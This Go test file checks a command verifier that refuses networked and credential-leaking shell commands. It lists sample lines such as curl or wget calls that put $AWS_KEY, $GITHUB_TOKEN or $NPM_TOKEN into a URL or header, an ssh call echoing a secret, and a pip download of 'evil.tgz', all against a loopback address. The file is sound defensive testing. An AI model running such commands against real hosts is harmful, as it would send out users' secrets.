package verifycore_test

import (
	"testing"

	verifycore "github.com/stainless-code/verdict/internal/core/verify"
)

func TestCheckStaticHardeningRefuses(t *testing.T) {
	t.Parallel()
	tests := []struct{ name, cmd, code string }{
		{"wget remote-name", `wget --remote-name http://127.0.0.1:9/f`, "verify-networked"},
		{"curl config", `curl -K /tmp/verify-fuzz-curlcfg http://127.0.0.1:9/`, "verify-networked"},
		{"curl config long", `curl --config /tmp/verify-fuzz-curlcfg http://127.0.0.1:9/`, "verify-networked"},
		{"wget input-file", `wget -i /tmp/verify-fuzz-wgeturls http://127.0.0.1:9/f`, "verify-networked"},
		{"git remote archive", `git archive --remote=ssh://127.0.0.1:9/x HEAD`, "verify-networked"},
		{"busybox wget", `busybox wget http://127.0.0.1:9/f`, "verify-networked"},
		{"pip download URL", `pip3 download http://127.0.0.1:9/evil.tgz`, "verify-networked"},
		{"telnet", `telnet 127.0.0.1 9`, "verify-networked"},
		{"curl telnet scheme", `curl telnet://127.0.0.1:9/`, "verify-networked"},
		{"secret var in URL", `curl http://127.0.0.1:9/$AWS_KEY`, "verify-credential-read"},
		{"secret var in header", `curl -s -H "X: $AWS_KEY" http://127.0.0.1:9/`, "verify-credential-read"},
		{"secret var braced", `curl http://127.0.0.1:9/${GITHUB_TOKEN}`, "verify-credential-read"},
		{"token var", `wget http://127.0.0.1:9/$NPM_TOKEN`, "verify-credential-read"},
		{"secret var in ssh", `ssh 127.0.0.1 "echo $MY_SECRET"`, "verify-credential-read"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			ref := verifycore.Check(tc.cmd)
			if ref == nil {
				t.Fatalf("Check(%q) = nil, want %s", tc.cmd, tc.code)
			}
			if ref.Code != tc.code {
				t.Fatalf("Check(%q) = %s, want %s", tc.cmd, ref.Code, tc.code)
			}
		})
	}
}

func TestCheckStaticHardeningBenignStaysClean(t *testing.T) {
	t.Parallel()
	for _, cmd := range []string{
		`wget --version`,
		`wget -qO- http://127.0.0.1:9/f`,
		`curl -k http://127.0.0.1:9/fixture`,
		`curl http://127.0.0.1:9/fixture`,
		`git archive HEAD`,
		`git ls-remote https://127.0.0.1:9/x.git`,
		`busybox echo ok`,
		`busybox sh -c 'printf ok'`,
		`pip3 --version`,
		`pip3 install -r /dev/null`,
		`printf telnet-ok`,
		`curl http://127.0.0.1:9/$PORT/fixture`,
		`curl http://127.0.0.1:9/$BRANCH/fixture`,
		`curl http://127.0.0.1:9/$PROXY_PORT/fixture`,
		`echo $AWS_KEY`,
		`printf '%s' $GITHUB_TOKEN`,
	} {
		if ref := verifycore.Check(cmd); ref != nil {
			t.Errorf("Check(%q) = %s: %q, want clean", cmd, ref.Code, ref.Message)
		}
	}
}
